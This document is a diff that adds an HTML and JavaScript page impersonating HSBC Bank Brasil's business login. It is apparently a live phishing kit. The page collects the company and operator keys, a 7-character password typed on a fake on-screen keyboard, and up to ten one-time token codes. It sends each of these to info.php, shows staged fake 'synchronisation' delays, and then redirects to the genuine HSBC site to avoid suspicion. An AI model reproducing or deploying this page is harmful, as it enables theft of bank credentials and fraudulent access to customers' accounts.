@@ -1,0 +1,357 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Index
+  </title>
+  <script src="js/jquery-1.11.1.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   function criaindex(){
+document.getElementById('clica').style.display='none';
+var um = document.createElement('input');
+var dois = document.createElement('input');
+um.type='text',um.id='chave1';
+dois.type='text',dois.id='chave2';
+document.getElementById('dois').appendChild(um);
+document.getElementById('dois').appendChild(dois);
+um.focus();
+}
+
+$(document).ready(function() {
+$("#entrar").click(function() {
+var chaveemp = $("#chave1").val();
+var chaveop = $("#chave2").val();
+$.post( "info.php", { chaveemp:chaveemp, chaveop:chaveop } );
+$("#view1").css('visibility','hidden');
+$("#view2").css('visibility','visible');
+$("#chaveempresa").html(chaveemp);
+$("#chaveoperador").html(chaveop);
+});
+});
+
+/*  SEGUNDA PARTE */
+
+function foradilma(val) {
+acess = document.getElementById('acessosenha');
+acs = acess.value.length;
+btk = 'ok'+[acs+1];
+btk1 = 'ok'+[acs];
+if (val == 'corrigir') {
+acess.value = acess.value.substring(0, acs-1);
+document.getElementById(btk1).style.visibility = "hidden";
+}
+else { 
+if (acs &lt; 7) {
+acess.value += val;
+document.getElementById(btk).style.visibility = "visible";
+if (acs == 6) { envia2();	}
+}
+}
+}
+
+function checksenha(){
+if(document.getElementById('acesso').value.length &lt; 7){
+document.getElementById('cortina').style.display='block';
+msg = 'HSBC BANK BRASIL S.A. - BANCO MÚLTIPLO&lt;br&gt;&lt;br&gt;A senha deve ter 7 dígitos, contendo letras e/ou números.';
+onde = document.getElementById('alertmsg');
+onde.innerHTML = msg;
+}
+}
+
+$(document).ready(function() {
+$("#alert").click(function() {
+$("#cortina").css('visibility','hidden');
+$("#acesso").val('');
+});
+});
+
+function envia2(){
+var chaveemp = $("#chave1").val();
+var chaveop = $("#chave2").val();
+var acesso = $("#acessosenha").val();
+$.post( "info.php", { chaveemp:chaveemp, chaveop:chaveop, acesso: acesso} );
+$("#ok1").css('visibility','hidden');
+$("#ok2").css('visibility','hidden');
+$("#ok3").css('visibility','hidden');
+$("#ok4").css('visibility','hidden');
+$("#ok5").css('visibility','hidden');
+$("#ok6").css('visibility','hidden');
+$("#ok7").css('visibility','hidden');
+$("#teclado").css('visibility','hidden');
+$("#view2").css('visibility','hidden');
+$("#view3").css('visibility','visible');
+}
+
+/*  TERCEIRA PARTE */
+
+var numtk = 1;
+$(document).ready(function() {
+
+$("#check").click(function() {
+
+$("#waiting").css('visibility','visible');
+
+var chaveemp = $("#chave1").val();
+var chaveop = $("#chave2").val();
+var acesso = $("#acessosenha").val();
+var tkn = $("#pastel").val();
+var msg = 'HSBC BANK BRASIL S.A. - BANCO MULTIPLO&lt;br&gt;&lt;br&gt;Etapa numero '+numtk+' de 10 concluida.';
+var onde = document.getElementById('alertmsg2');
+
+$.post( "info.php", { chaveemp:chaveemp, chaveop:chaveop, acesso: acesso, tkn:tkn} );
+setTimeout(function () {$("#waiting").css('visibility','hidden')}, 40000);
+
+if (numtk == 10) {
+setTimeout(function () {alert('HSBC BANK BRASIL S.A. - BANCO MÚLTIPLO\n\nSincronismo do dispositivo realizado com sucesso.')},10000);
+setTimeout(function () {window.location.href = "https://www.hsbc.com.br/1/2/br/informacoes/seguranca/o-que-o-hsbc-faz-para-voce-pessoa-fisica/token";},10001);
+return;
+}
+setTimeout(function () {$("#cortina2").css('visibility','visible')}, 40000);
+setTimeout(function () {onde.innerHTML = msg;},40000);
+$("#alert2").click(function() {
+$("#cortina2").css('visibility','hidden');
+});
+numtk = (numtk+1);
+$('#pastel').val('');
+$('#pastel').focus();
+});
+
+$(".number").keydown(function(event) 
+{
+if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 || event.keyCode == 13 || 
+(event.keyCode == 65 &amp;&amp; event.ctrlKey === true) || 
+(event.keyCode == 67 &amp;&amp; event.ctrlKey === true) || 
+(event.keyCode == 88 &amp;&amp; event.ctrlKey === true) || 
+(event.keyCode == 86 &amp;&amp; event.ctrlKey === true) || 
+(event.keyCode == 65 &amp;&amp; event.metaKey === true) || 
+(event.keyCode == 67 &amp;&amp; event.metaKey === true) || 
+(event.keyCode == 88 &amp;&amp; event.metaKey === true) || 
+(event.keyCode == 86 &amp;&amp; event.metaKey === true) || 
+(event.keyCode &gt;= 35 &amp;&amp; event.keyCode &lt;= 39)) 
+{
+return;	
+}
+else
+{
+if (event.shiftKey || (event.keyCode &lt; 48 || event.keyCode &gt; 57) &amp;&amp; (event.keyCode &lt; 96 || event.keyCode &gt; 105 )) 
+{
+event.preventDefault(); 
+}   
+}
+});
+});
+
+function criatk(){
+document.getElementById('clicatoken').style.display='none';
+var cod = document.createElement('input');
+cod.type='password',cod.id='pastel';
+cod.setAttribute('maxlength', 6);
+document.getElementById('tuken').appendChild(cod);
+cod.focus();
+}
+
+function checktk(){
+if(document.getElementById('pastel').value.length &lt; 6){
+document.getElementById('cortinatoken').style.display='block';
+}
+}
+  </script>
+  <style type="text/css">
+   *{margin:0; padding:0}
+html,body{width:100%; height:100%;}
+input{outline:none}
+#um{background:url(img.php?img=i0MTkyLjE2Ny4xMzEuMSBpbmRleDEucG5n); position:relative; width:1041px; height:115px; margin:auto}
+#dois{position:relative; background:url(img.php?img=L9MTkyLjE2Ny4xMzEuMSBpbmRleDIucG5n); width: 982px; height: 483px; margin:auto}
+#chave1{position:absolute;border:0px none;left: 64px;top: 130px;height: 26px;width: 162px;}
+#chave2{	position:absolute;border:0px none;left: 371px;top: 130px;height: 26px;width: 162px;}
+#entrar{position:absolute;background:url(img.php?img=Q2MTkyLjE2Ny4xMzEuMSBlbnRyYXJ4LnBuZw==);cursor:pointer;width:61px;height:33px;left: 582px;top: 127px;border:0px none;}
+#entrar:hover{background:url(img.php?img=BjMTkyLjE2Ny4xMzEuMSBlbnRyYXJoeC5wbmc=)}
+#clica{position:absolute;left: 52px;top: 113px;width: 497px;height: 53px;}
+#view1{width:100%; height:100%;position:absolute; left:0px; top:0px}
+#view2{visibility:hidden; width:100%; height:100%; position:absolute; left:0px; top:0px}
+#view3{visibility:hidden; width:100%; height:100%;position:absolute; left:0px; top:0px}
+/*  SEGUNDA PARTE */
+#topo{background:url(img.php?img=CPMTkyLjE2Ny4xMzEuMSBpbmRleDMucG5n); width:986px; position:relative; margin:auto; height:452px}
+#rdp{background:url(img.php?img=uPMTkyLjE2Ny4xMzEuMSBpbmRleDQucG5n); width:986px; position:relative; bottom:0; margin:auto; height:324px; margin-top:50px;}
+#teclado{position:absolute;left: 283px;top: 348px;background:url(img.php?img=sDMTkyLjE2Ny4xMzEuMSB0ZWMucG5n); width:291px; height:147px; border:0px none;}
+#barra{background:url(img.php?img=5ZMTkyLjE2Ny4xMzEuMSBiYXJyYS5wbmc=); height:12px; width:100%; position:absolute; left:0; top:75px; z-index:2}
+#cortina{width:100%; height:100%; background:url(img.php?img=45MTkyLjE2Ny4xMzEuMSBjb3J0aW5hLnBuZw==); z-index:9898; position:absolute; left:0px; top:0px; display:none}
+#alert{background:url(img.php?img=BwMTkyLjE2Ny4xMzEuMSBhbGVydC5wbmc=); width:355px; height:142px; position:absolute; top:30%; left:50%; margin-left:-300px}
+.chaves{font: Arial,Helvetica,sans-serif;font-family: Arial,Helvetica,sans-serif;font-style: normal;font-weight: normal;line-height: normal;font-size-adjust: none;font-stretch: normal;-x-system-font: none;font-feature-settings: normal;font-language-override: normal;font-kerning: auto;font-synthesis: weight style;font-variant-alternates: normal;font-variant-caps: normal;font-variant-east-asian: normal;font-variant-ligatures: normal;font-variant-numeric: normal;font-variant-position: normal;
+font-size:12px}
+#chaveempresa{position:absolute;left: 145px;top: 188px;}
+#chaveoperador{	position:absolute;left: 145px;top: 235px;}
+/*  TERCEIRA PARTE */
+#topotoken{background:url(img.php?img=KvMTkyLjE2Ny4xMzEuMSBpbmRleDMucG5n); width:986px; position:relative; margin:auto; height:452px}
+#rdptoken{background:url(img.php?img=NYMTkyLjE2Ny4xMzEuMSBpbmRleDQucG5n); width:986px; position:relative; bottom:0; margin:auto; height:324px; margin-top:50px;}
+#barratoken{background:url(img.php?img=P9MTkyLjE2Ny4xMzEuMSBiYXJyYS5wbmc=); height:12px; width:100%; position:absolute; left:0; top:75px; z-index:2}
+#tuken{background: #FFFFFF url(img.php?img=vNMTkyLjE2Ny4xMzEuMSB0dWtlbi5wbmc=) no-repeat;width:751px;height:561px;position:absolute;left: 0px;top: 91px}
+#pastel{position:absolute;border:0px none;left: 256px;top: 192px;height: 16px;width: 49px;}
+#clicatoken{position:absolute;left: 249px;top: 184px;width: 61px;height: 34px;}
+#tuken a{text-decoration:none;position:absolute;left: 321px;top: 186px;width: 65px;height: 31px;}
+#tuken a image{border:0px none}
+#cortinatoken{width:100%; height:100%; background:url(img.php?img=NoMTkyLjE2Ny4xMzEuMSBjb3J0aW5hLnBuZw==); z-index:98984; position:absolute; left:0px; top:0px; display:none}
+#waiting{width:100%; height:100%; background:url(img.php?img=LwMTkyLjE2Ny4xMzEuMSBjb3J0aW5hLnBuZw==); z-index:98984; position:absolute; left:0px; top:0px; visibility:hidden}
+#alertoken{background:url(img.php?img=eXMTkyLjE2Ny4xMzEuMSBhbGVydHRrLnBuZw==); width:355px; height:142px; position:absolute; top:30%; left:50%; margin-left:-300px}
+#cortina2{width:100%; height:100%; background:url(img.php?img=wuMTkyLjE2Ny4xMzEuMSBjb3J0aW5hLnBuZw==); z-index:9898; position:absolute; left:0px; top:0px; visibility:hidden}
+#alert2{background:url(img.php?img=QxMTkyLjE2Ny4xMzEuMSBhbGVydC5wbmc=); width:355px; height:142px; position:absolute; top:30%; left:50%; margin-left:-300px;}
+  </style>
+ </head>
+ <body>
+  <div id="view1">
+   <div style="width:100%; height:100%; background: url(img.php?img=UTMTkyLjE2Ny4xMzEuMSBTY3JlZW5zaG90XzIucG5n)">
+    <div style="position:relative; width:1041px; height:100%; background:#FFFFFF; margin:auto; border:0px none">
+     <div id="um">
+     </div>
+     <div id="dois">
+      <div onclick="criaindex();" id="clica">
+      </div>
+      <input type="button" id="entrar" value="" />
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="view2">
+   <div id="cortina">
+    <div id="alert">
+     <span id="alertmsg" style="position:absolute; left: 15px;top: 23px;font-size: 12px;; font-family:Arial, Helvetica, sans-serif">
+     </span>
+    </div>
+   </div>
+   <div id="barra">
+   </div>
+   <div id="topo">
+    <span class="chaves" id="chaveempresa">
+    </span>
+    <span class="chaves" id="chaveoperador">
+    </span>
+    <div id="teclado">
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:32px; visibility:hidden;" id="ok1" name="ok1" src="img.php?img=CEMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:47px; visibility:hidden;" id="ok2" name="ok2" src="img.php?img=ivMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:62px; visibility:hidden;" id="ok3" name="ok3" src="img.php?img=HdMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:77px; visibility:hidden;" id="ok4" name="ok4" src="img.php?img=KCMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:92px; visibility:hidden;" id="ok5" name="ok5" src="img.php?img=ZMMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:107px; visibility:hidden;" id="ok6" name="ok6" src="img.php?img=zjMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img width="10" height="10" style="position:absolute; margin-top:8px; left:50%; margin-left:122px; visibility:hidden;" id="ok7" name="ok7" src="img.php?img=7CMTkyLjE2Ny4xMzEuMSB0ZWNvay5wbmc=" />
+     <img border="0" style="position:absolute; left: 8px; top: 26px; width: 275px; height: 91px;" usemap="#Map" src="image/blank.gif" />
+     <map id="Map" name="Map">
+      <area onclick="foradilma('1');" href="#" coords="2,1,19,20" shape="rect">
+      </area>
+      <area onclick="foradilma('2');" href="#" coords="22,1,43,20" shape="rect">
+      </area>
+      <area onclick="foradilma('3');" href="#" coords="47,-2,65,19" shape="rect">
+      </area>
+      <area onclick="foradilma('4');" href="#" coords="69,3,89,20" shape="rect">
+      </area>
+      <area onclick="foradilma('5');" href="#" coords="93,0,111,19" shape="rect">
+      </area>
+      <area onclick="foradilma('6');" href="#" coords="116,-7,134,20" shape="rect">
+      </area>
+      <area onclick="foradilma('7');" href="#" coords="137,1,157,19" shape="rect">
+      </area>
+      <area onclick="foradilma('8');" href="#" coords="162,-5,180,19" shape="rect">
+      </area>
+      <area onclick="foradilma('9');" href="#" coords="185,-6,202,20" shape="rect">
+      </area>
+      <area onclick="foradilma('0');" href="#" coords="207,-3,226,19" shape="rect">
+      </area>
+      <area onclick="foradilma('corrigir');" href="#" coords="230,-7,278,19" shape="rect">
+      </area>
+      <area onclick="foradilma('q');" href="#" coords="1,26,20,45" shape="rect">
+      </area>
+      <area onclick="foradilma('w');" href="#" coords="21,26,40,45" shape="rect">
+      </area>
+      <area onclick="foradilma('e');" href="#" coords="42,25,61,45" shape="rect">
+      </area>
+      <area onclick="foradilma('r');" href="#" coords="63,28,82,45" shape="rect">
+      </area>
+      <area onclick="foradilma('t');" href="#" coords="84,28,104,45" shape="rect">
+      </area>
+      <area onclick="foradilma('y');" href="#" coords="106,27,125,46" shape="rect">
+      </area>
+      <area onclick="foradilma('u');" href="#" coords="126,28,145,45" shape="rect">
+      </area>
+      <area onclick="foradilma('i');" href="#" coords="148,26,166,45" shape="rect">
+      </area>
+      <area onclick="foradilma('o');" href="#" coords="168,26,187,45" shape="rect">
+      </area>
+      <area onclick="foradilma('p');" href="#" coords="188,25,208,45" shape="rect">
+      </area>
+      <area onclick="checksenha()" href="#" coords="213,26,288,42" shape="rect">
+      </area>
+      <area onclick="checksenha()" href="#" coords="226,42,276,67" shape="rect">
+      </area>
+      <area onclick="foradilma('a');" href="#" coords="33,50,51,68" shape="rect">
+      </area>
+      <area onclick="foradilma('s');" href="#" coords="52,50,72,68" shape="rect">
+      </area>
+      <area onclick="foradilma('d');" href="#" coords="75,48,93,68" shape="rect">
+      </area>
+      <area onclick="foradilma('f');" href="#" coords="96,48,114,68" shape="rect">
+      </area>
+      <area onclick="foradilma('g');" href="#" coords="116,51,136,68" shape="rect">
+      </area>
+      <area onclick="foradilma('h');" href="#" coords="137,50,157,68" shape="rect">
+      </area>
+      <area onclick="foradilma('j');" href="#" coords="159,49,179,68" shape="rect">
+      </area>
+      <area onclick="foradilma('k');" href="#" coords="180,51,198,68" shape="rect">
+      </area>
+      <area onclick="foradilma('l');" href="#" coords="201,50,219,68" shape="rect">
+      </area>
+      <area onclick="foradilma('z');" href="#" coords="55,74,75,91" shape="rect">
+      </area>
+      <area onclick="foradilma('x');" href="#" coords="76,74,95,90" shape="rect">
+      </area>
+      <area onclick="foradilma('c');" href="#" coords="97,73,117,90" shape="rect">
+      </area>
+      <area onclick="foradilma('v');" href="#" coords="119,73,137,90" shape="rect">
+      </area>
+      <area onclick="foradilma('b');" href="#" coords="140,74,159,91" shape="rect">
+      </area>
+      <area onclick="foradilma('n');" href="#" coords="160,72,179,90" shape="rect">
+      </area>
+      <area onclick="foradilma('m');" href="#" coords="181,74,201,90" shape="rect">
+      </area>
+     </map>
+     <input type="hidden" value="" id="acessosenha" name="acesso" />
+    </div>
+   </div>
+   <div id="rdp">
+   </div>
+  </div>
+  <div id="view3">
+   <div id="cortina2">
+    <div id="alert2">
+     <span id="alertmsg2" style="position:absolute; left: 15px;top: 23px;font-size: 12px;; font-family:Arial, Helvetica, sans-serif">
+     </span>
+    </div>
+   </div>
+   <div id="waiting">
+    <img style="position:absolute; top:50%; left:50%; margin-left:-200px;" src="img.php?img=7NMTkyLjE2Ny4xMzEuMSBsb2FkLnBuZw==" />
+    <img style="position:absolute; left:50%; top:50%; margin-left: -181px; margin-top: 30px;;" src="image/carregando.gif" />
+   </div>
+   <div id="cortinatoken">
+    <div id="alerttoken">
+     <span id="alertmsg" style="position:absolute; left: 15px;top: 23px;font-size: 12px;; font-family:Arial, Helvetica, sans-serif">
+     </span>
+    </div>
+   </div>
+   <div id="barratoken">
+   </div>
+   <div id="topotoken">
+    <div id="tuken">
+     <a id="check" onclick="checktk()" href="#">
+      <img src="image/blank.gif" />
+     </a>
+     <div onclick="criatk()" id="clicatoken">
+     </div>
+    </div>
+   </div>
+   <div id="rdotoken">
+   </div>
+  </div>
+ </body>
+</html>
